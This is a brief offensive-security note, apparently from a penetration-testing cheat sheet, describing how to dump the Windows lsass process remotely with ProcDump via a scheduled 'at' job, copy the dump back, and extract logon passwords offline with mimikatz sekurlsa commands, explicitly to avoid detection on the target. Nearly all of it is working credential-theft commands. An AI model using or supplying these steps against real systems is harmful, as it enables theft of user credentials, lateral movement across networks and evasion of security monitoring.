Using ProcDump to get a dump of the lsass process. Requires ProcDump to be copied to the target machine.
ProcDump.bat just to help facilitate 'one click' execution

at \\192.168.1.3 20:55 C:\windows\temp\procdump.bat


From there you'll have a dump file, copy it back from the remote host and use mimikatz alpha to retrieve the creds from the dump file. This has the advantage of not worrying about mimikatz detection on the target.

from the mimikatz blog post:

#Switch to minidump
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
